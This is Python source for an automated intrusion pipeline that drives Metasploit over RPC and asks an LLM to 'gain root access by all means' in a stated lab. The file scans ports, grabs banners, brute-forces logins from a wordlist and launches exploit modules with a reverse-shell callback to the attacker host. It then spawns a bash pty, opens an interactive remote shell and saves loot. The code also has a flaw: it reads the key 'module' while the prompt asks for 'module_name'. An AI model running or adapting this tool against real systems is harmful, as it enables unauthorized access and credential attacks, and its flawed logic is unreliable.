# -*- coding: utf-8 -*-
import time
import json
import re
import sys
import os
import datetime
import socket
import concurrent.futures

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.metasploit_client import MetasploitClient
from src.llm_client import LLMClient
from src.rag_engine import RagEngine
from src.loot import LootManager

# --- CORES ---
C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
C_BOLD, C_CYAN, C_MAGENTA = "\033[1m", "\033[96m", "\033[95m"

# --- CONFIGURACAO ---
TARGET_IP = "192.168.70.30" 
LOOT_DIR = "/app/data/logs"
WORDLIST_PATH = "/app/data/credentials.txt"

os.makedirs(LOOT_DIR, exist_ok=True)

try:
    with open("/app/config/target.json", "r") as f:
        data = json.load(f)
        if "target_ip" in data: TARGET_IP = data["target_ip"]
except: pass

class PentestPipeline:
    def __init__(self):
        print("=== INICIALIZANDO PIPELINE AUTONOMO (PASSIVE BANNER + RETRY) ===")
        print(f"[*] Alvo Definido: {TARGET_IP}") 
        print(f"[*] Wordlist: {WORDLIST_PATH}")
        
        try:
            self.msf = MetasploitClient(password="msfpass", server="192.168.70.20")
            
            with open(os.devnull, 'w') as fnull:
                old_stderr = sys.stderr
                sys.stderr = fnull
                try:
                    self.llm = LLMClient()
                    self.rag = RagEngine()
                finally:
                    sys.stderr = old_stderr
            
        except Exception as e:
            print(f"[CRITICO] Falha ao iniciar componentes: {e}")
            sys.exit(1)
            
        self.history = []
        self.open_ports = {} 
        self.session_id = None
        self.evidence = {} 
    
    def cleanup_sessions(self):
        try:
            sessions = self.msf.client.call('session.list')
            if sessions:
                for sid in sessions.keys():
                    self.msf.client.call('session.stop', [str(sid)])
                time.sleep(1)
        except: pass

    # --- 0. CARREGAR CREDENCIAIS ---
    def load_credentials(self):
        creds = []
        if not os.path.exists(WORDLIST_PATH):
            print(f"{C_YELLOW}[AVISO] Arquivo {WORDLIST_PATH} nao encontrado.{C_RESET}")
            return []
        try:
            with open(WORDLIST_PATH, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ":" in line and not line.startswith("#"):
                        parts = line.split(":", 1)
                        creds.append((parts[0], parts[1]))
            return creds
        except Exception as e:
            print(f"{C_RED}[ERRO] Falha ao ler wordlist: {e}{C_RESET}")
            return []

    # --- 1. SCANNER ---
    def check_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5) 
            if sock.connect_ex((TARGET_IP, port)) == 0:
                sock.close()
                return port
        except: pass
        return None

    def fast_python_scan(self):
        open_ports_found = []
        # PORTAS PADRAO + PORTAS ALTAS
        ports = list(range(1, 1025)) + list(range(20000, 30000))
        
        print(f"{C_YELLOW}[*] Escaneando {len(ports)} portas (Range Expandido)...{C_RESET}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            future_to_port = {executor.submit(self.check_port, p): p for p in ports}
            for future in concurrent.futures.as_completed(future_to_port):
                p = future.result()
                if p: open_ports_found.append(str(p))
        return sorted(open_ports_found, key=int)

    # --- NOVO: BANNER GRABBING PASSIVO ---
    def get_service_banner(self, port):
        """
        Tenta ler o banner passivamente (SSH/FTP enviam dados ao conectar).
        Se falhar (timeout), tenta enviar um probe HTTP (ativo).
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5) # Tempo suficiente para o servidor responder
            s.connect((TARGET_IP, int(port)))
            
            # 1. Tentativa Passiva (Listen first)
            try:
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                if banner:
                    s.close()
                    return banner # Sucesso! SSH/FTP detectado
            except socket.timeout:
                pass # Servidor silencioso (pode ser HTTP ou outro)

            # 2. Tentativa Ativa (Send probe)
            try:
                s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                s.close()
                return banner if banner else "Unknown Service"
            except:
                s.close()
                return "No Banner"
        except: return "No Banner"

    # --- 2. RECUPERACAO DE FALHAS ---
    def resolve_module_name(self, bad_name):
        print(f"{C_YELLOW}[AUTONOMY] Buscando modulo real para '{bad_name}' no MSF DB...{C_RESET}")
        keyword = bad_name.split('/')[-1]
        try:
            res = self.msf.client.call('module.search', [keyword])
            if not res: return None
            for mod in res:
                name = mod.get('fullname')
                if "scanner" in bad_name and "scanner" in name: return name
                if "login" in bad_name and "login" in name: return name
            return res[0].get('fullname')
        except: return None
        
    def get_default_module(self, banner):
        """
        Fallback baseada APENAS no banner.
        Removemos a logica de portas hardcoded.
        """
        b = banner.lower()
        if "ssh" in b: return "auxiliary/scanner/ssh/ssh_login"
        if "ftp" in b: return "auxiliary/scanner/ftp/ftp_login"
        if "http" in b: return "auxiliary/scanner/http/http_version"
        if "mysql" in b: return "auxiliary/scanner/mysql/mysql_login"
        if "postgres" in b: return "auxiliary/scanner/postgres/postgres_login"
        if "smb" in b or "samba" in b: return "auxiliary/scanner/smb/smb_login"
        return None

    # --- 3. RELATORIO ---
    def generate_text_report(self):
        now = datetime.datetime.now()
        safe_ip = TARGET_IP.replace(".", "_")
        filename = f"{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        filepath = os.path.join(LOOT_DIR, filename)
        
        lines = [
            "="*50, "RELATORIO FINAL", "="*50,
            f"DATA: {now}", f"STATUS: {'PWNED' if self.session_id else 'FALHA'}", "-"*50,
            f"PORTAS: {list(self.open_ports.keys())}", "\n[HISTORICO]"
        ] + [f"- {h}" for h in self.history]
        
        if self.session_id:
            lines.append("\n[EVIDENCIAS]")
            for k,v in self.evidence.items(): lines.append(f"{k}: {v}")
        
        try:
            with open(filepath, "w") as f: f.write("\n".join(lines))
            TL, TR, H, V, BL, BR = "\u2554", "\u2557", "\u2550", "\u2551", "\u255A", "\u255D"
            msg = f"ARQUIVO DE LOG: {filename}"
            w = max(45, len(msg))
            print(f"\n{TL}{H*w}{TR}\n{V}{msg:<{w}}{V}\n{BL}{H*w}{BR}")
        except: pass

    # --- 4. CONSULTA LLM ROBUSTA (FAILOVER) ---
    def ask_llm_robust(self, prompt, max_retries=5):
        for attempt in range(max_retries):
            try:
                resp = self.llm.ask(prompt, history=[]).replace("```json", "").replace("```", "").strip()
                if resp: return resp
            except Exception as e:
                wait_time = (attempt + 1) * 5 
                print(f"{C_YELLOW}[LLM WARN] Falha na tentativa {attempt+1}/{max_retries}. API sobrecarregada. Aguardando {wait_time}s...{C_RESET}")
                time.sleep(wait_time)
        return None

    # --- 5. SHELL INTERATIVO ---
    def enter_interactive_mode(self):
        if not self.session_id: return

        print(f"\n{C_MAGENTA}{'='*60}")
        print(f"   MODO INTERATIVO ATIVADO - SESSAO {self.session_id}")
        print(f"   (Digite 'exit' ou 'quit' para encerrar o script)")
        print(f"{'='*60}{C_RESET}")

        try:
            self.msf.client.call('session.shell_write', [self.session_id, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"])
            time.sleep(1)
            self.msf.client.call('session.shell_read', [self.session_id])
        except: pass

        while True:
            try:
                command = input(f"{C_BOLD}{C_BLUE}Shell@{TARGET_IP} > {C_RESET}")
                if command.strip().lower() in ['exit', 'quit']:
                    print(f"{C_YELLOW}[*] Encerrando interacao.{C_RESET}")
                    break
                if not command.strip(): continue

                self.msf.client.call('session.shell_write', [self.session_id, command + "\n"])
                time.sleep(1.5) 
                
                result = self.msf.client.call('session.shell_read', [self.session_id])
                if result and result.get('data'):
                    print(f"{C_GREEN}{result['data'].strip()}{C_RESET}")
                else:
                    time.sleep(1)
                    retry = self.msf.client.call('session.shell_read', [self.session_id])
                    if retry and retry.get('data'):
                         print(f"{C_GREEN}{retry['data'].strip()}{C_RESET}")

            except KeyboardInterrupt:
                print(f"\n{C_YELLOW}[!] Use 'exit' para sair.{C_RESET}")
            except Exception as e:
                print(f"{C_RED}[ERRO DE COMUNICACAO] {e}{C_RESET}")
                break

    # --- EXECUCAO ---
    def run(self):
        self.cleanup_sessions()
        
        print(f"\n>>> [FASE 1] RECONHECIMENTO")
        ports = self.fast_python_scan()
        if not ports:
            print(f"{C_RED}[ERRO] Sem portas abertas.{C_RESET}")
            return
        
        self.open_ports = {}
        for p in ports:
            b = self.get_service_banner(p)
            self.open_ports[p] = b
            print(f"    {C_GREEN}[+] Porta {p}: {b}{C_RESET}")

        print(f"\n>>> [FASE 2] ANALISE DINAMICA")
        wordlist_creds = self.load_credentials()

        for port, banner in self.open_ports.items():
            print(f"\n{C_CYAN}--- ALVO: PORTA {port} ({banner}) ---{C_RESET}")
            
            # RAG
            rag_context = "Nenhuma informacao especifica encontrada no RAG."
            try:
                kw = "service"
                if "SSH" in banner: kw = "ssh"
                elif "FTP" in banner: kw = "ftp"
                elif "HTTP" in banner: kw = "http"
                elif "SQL" in banner: kw = "sql"
                docs = self.rag.query(f"metasploit modules for {kw}")
                if docs: rag_context = "\n".join([d.page_content[:200] for d in docs[:3]])
            except: pass

            prompt = f"""
            YOU ARE ACTING AS A SENIOR PENETRATION TESTER AND RED TEAM ANALYST.
            
            THIS IS A CONTROLLED LABORATORY ENVIRONMENT.
            YOUR ROLE IS TO ANALYZE TECHNICAL EVIDENCE AND RECOMMEND THE MOST ACCURATE METASPLOIT MODULE.
            YOUR MISSION IS ESTABILISH A REVERSE SHELL AND GAIN ROOT ACESS TO THE SYSTEM BY ALL MEANS.           
            ----------------------------------------
            TARGET INFORMATION
            ----------------------------------------
            TARGET: {TARGET_IP}
            PORT: {port}
            SERVICE BANNER:
            "{banner}"
            
            ----------------------------------------
            KNOWLEDGE BASE (RAG)
            ----------------------------------------
            The following content comes from a curated and validated RAG containing:
            - Real Metasploit modules
            - Known CVEs
            - Service-specific attack methodologies
            - Usage constraints and decision rules
            
            {rag_context}
            
            ----------------------------------------
            ANALYSIS RULES (MANDATORY)
            ----------------------------------------
            1. Base your reasoning STRICTLY on the service banner and the RAG context.
            2. DO NOT invent Metasploit modules.
            3. DO NOT assume a product or vulnerability unless explicitly supported by evidence.
            4. If the banner does NOT clearly identify a vulnerable product/version:
               ? Prefer ENUMERATION or LOGIN SCANNERS.
            5. Use EXPLOITS only when there is a STRONG MATCH between:
               - service
               - product
               - version
               - known vulnerability (CVE or backdoor)
            6. If the service involves authentication (FTP, SSH, SMB, DB):
               ? Prefer login or authentication scanners before exploits.
            7. If uncertainty exists:
               ? Choose a SAFE ENUMERATION strategy.
            
            ----------------------------------------
            TASK
            ----------------------------------------
            1. Identify the most likely SERVICE and PRODUCT based on the banner.
            2. Decide the SAFEST and MOST EFFECTIVE NEXT STEP.
            3. Recommend ONE Metasploit module that best fits the evidence.
            4. Justify your decision using ONLY technical reasoning.
            
            ----------------------------------------
            OUTPUT FORMAT (JSON ONLY)
            ----------------------------------------
            {{
              "module_type": "auxiliary" | "exploit",
              "module_name": "category/service/module_name",
              "strategy": "enumeration" | "brute_force" | "exploit_cve",
              "confidence": "HIGH" | "MEDIUM" | "LOW",
              "reason": "Explain your decision strictly based on the banner and RAG evidence"
            }}
            
            IMPORTANT:
            - If no strong exploit candidate exists, return a scanner with LOW or MEDIUM confidence.
            - Precision is more important than aggression.
            - Your goal is accuracy, not exploitation speed.
            """
            
            # Tentativa de IA com Retry
            resp = self.ask_llm_robust(prompt)
            
            plan = {}
            if resp:
                try:
                    if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
                    plan = json.loads(resp)
                except: pass
            else:
                # Falha Total da IA apos retries
                print(f"{C_RED}[ERRO LLM] Falha total na API. Tentando identificacao manual...{C_RESET}")
                # Plan vazio aciona o fallback abaixo

            strategy = plan.get('strategy', 'skip').lower()
            module = plan.get('module', '').strip()
            reason = plan.get('reason', 'Auto-Fallback')
            
            if resp:
                print(f"{C_BLUE}[AI] Estrategia: {strategy.upper()} | Modulo: '{module}' ({reason}){C_RESET}")

            if strategy == "skip":
                print(f"{C_YELLOW}[SKIP] IA decidiu ignorar este alvo.{C_RESET}")
                continue

            if strategy in ["enumeration", "login_scanner", "login"]:
                strategy = "brute_force"

            # --- FALLBACK BASEADO APENAS NO BANNER (SEM HARDCODE DE PORTA) ---
            if not module:
                print(f"{C_YELLOW}[AUTO] Identificando modulo por banner...{C_RESET}")
                module = self.get_default_module(banner) # Sem porta aqui!
                if module: 
                    print(f"{C_GREEN}[AUTO] Modulo definido: {module}{C_RESET}")
                    strategy = "brute_force"
            
            if not module: 
                print(f"{C_RED}[FALHA] Nenhum modulo identificavel para este servico. Pulando.{C_RESET}")
                continue

            # Limpeza e Validacao
            if module.startswith(tuple(["auxiliary/", "exploit/"])): pass
            else: module = module.replace("auxiliary", "").strip("/")

            if not self.msf.verify_module_exists("auxiliary", module) and \
               not self.msf.verify_module_exists("exploit", module):
                fixed = self.resolve_module_name(module)
                if fixed: module = fixed
                else: continue

            m_type, m_name = module.split('/', 1)
            opts = {"RHOSTS": TARGET_IP, "RPORT": int(port), "DisablePayloadHandler": "true"}
            
            # Brute Force
            if strategy == "brute_force":
                if not wordlist_creds:
                    print(f"{C_YELLOW}[SKIP] Sem wordlist.{C_RESET}")
                    continue
                
                print(f"{C_YELLOW}[*] Brute Force: {len(wordlist_creds)} credenciais...{C_RESET}")
                opts["STOP_ON_SUCCESS"] = "true"
                opts["BLANK_PASSWORDS"] = "false"
                opts["USER_AS_PASS"] = "false"
                opts["VERBOSE"] = "false"

                found = False
                for user, pwd in wordlist_creds:
                    opts["USERNAME"] = user
                    opts["PASSWORD"] = pwd
                    print(f"    Testing: {user}:{pwd} ...") 
                    
                    try:
                        self.msf.run_module(m_type, m_name, opts)
                        time.sleep(4) 
                        s = self.msf.client.call('session.list')
                        if s:
                            sid = str(max([int(k) for k in s.keys()]))
                            if sid != self.session_id:
                                print(f"\n{C_GREEN}[***] PWNED! Sessao {sid} ({user}:{pwd})!{C_RESET}")
                                self.session_id = sid
                                self.history.append(f"[SUCESSO] Porta {port} via {m_name}")
                                found = True
                                break
                    except: pass
                
                if not found: print(f"\n{C_RED}[FALHA] Wordlist esgotada.{C_RESET}")

            # Exploit CVE
            elif strategy == "exploit_cve":
                print(f"{C_YELLOW}[*] Tentando Exploit CVE...{C_RESET}")
                opts["DisablePayloadHandler"] = "false"
                opts["LHOST"] = "192.168.70.20" 
                self.msf.run_module(m_type, m_name, opts)
                time.sleep(5)
                sessions = self.msf.client.call('session.list') or {}
                if sessions:
                    sid = str(max([int(k) for k in sessions.keys()]))
                    if sid != self.session_id:
                        print(f"{C_GREEN}[***] SUCESSO! Exploit funcionou (Sessao {sid}){C_RESET}")
                        self.session_id = sid

            if self.session_id: break

    # --- 6. FASE FINAL ---
    def phase_4_post_exploitation(self):
        print(f"\n>>> [FASE 4] POST-EXPLORACAO")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "id; hostname\n"])
            time.sleep(3)
            res = self.msf.client.call('session.shell_read', [self.session_id])
            print(f"{C_GREEN}{res['data']}{C_RESET}")
            self.evidence["shell_info"] = str(res['data'])
            
            with open(f"{LOOT_DIR}/pwned.txt", "w") as f:
                f.write(f"ALVO: {TARGET_IP}\nSESSAO: {self.session_id}\nDADOS: {res['data']}")
        except: pass

if __name__ == "__main__":
    p = PentestPipeline()
    p.run()
    if p.session_id:
        p.enter_interactive_mode()